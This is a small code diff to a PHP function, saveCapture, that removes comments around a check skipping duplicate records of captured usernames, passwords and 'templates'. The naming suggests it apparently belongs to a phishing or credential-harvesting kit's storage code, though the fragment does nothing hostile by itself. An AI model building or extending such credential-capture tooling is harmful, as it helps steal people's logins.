@@ -33,12 +33,11 @@ function saveCapture($record) {
         }
     }
 
-    // Check for exact duplicates
+  
     foreach ($data as $existing) {
         if (($existing['username'] ?? '') === ($record['username'] ?? '') &&
             ($existing['password'] ?? '') === ($record['password'] ?? '') &&
             ($existing['template'] ?? '') === $template) {
-            // Already exists, don't append
             return;
         }
     }
